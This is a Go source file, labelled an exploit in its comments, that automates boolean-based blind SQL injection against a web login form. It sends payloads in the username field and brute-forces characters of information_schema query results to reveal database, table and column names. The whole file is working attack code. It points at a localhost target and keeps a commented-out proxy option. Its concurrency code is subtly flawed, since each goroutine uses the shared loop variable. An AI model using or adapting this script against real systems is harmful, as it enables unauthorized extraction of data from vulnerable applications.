// this expliot's purpose to retrieve the databases, tables, columns name
// from vuln web apps for blind SQLi

package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

func retrieve(tURL, contentType, payload string, t int) {
	for n := 47; n < 130; n++ {
		form := url.Values{}
		form.Set("username",
			"x' or ascii(substring(("+payload+"),"+strconv.Itoa(t)+",1))="+strconv.Itoa(n)+"#")

		reqBody := strings.NewReader(form.Encode())

		// req, err := http.NewRequest("post", tURL, reqBody)
		// if err != nil {
		// 	panic(err)
		// }
		// req.Header.Set("Content-Type", contentType)
		// with proxy
		// resp, err := client.Do(req)
		// if err != nil {
		// 	panic(err)
		// }

		// with out proxy

		resp, err := http.Post(tURL, contentType, reqBody)
		if err != nil {
			fmt.Printf("Error making POST request: %v\n", err)
			return
		}

		resBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if "W" == string(string(resBody)[0]) {
			fmt.Println(string(rune(n)))
		}
	}
}

func main() {

	start := time.Now()
	// // target's data
	tURL := "http://127.0.0.1:9090/login"
	contentType := "application/x-www-form-urlencoded"
	payload := "select column_name from information_schema.columns where table_name='users' limit 5,1"
	// proxy data
	// proxyURL, _ := url.Parse("http://192.168.176.1:8077")
	// transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
	// client := &http.Client{Transport: transport}

	var wg sync.WaitGroup
	for t := 0; t < 25; t++ {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			retrieve(tURL, contentType, payload, t)
		}(t)
	}

	wg.Wait()

	duration := time.Since(start)
	fmt.Println("go takes: ", duration)
}
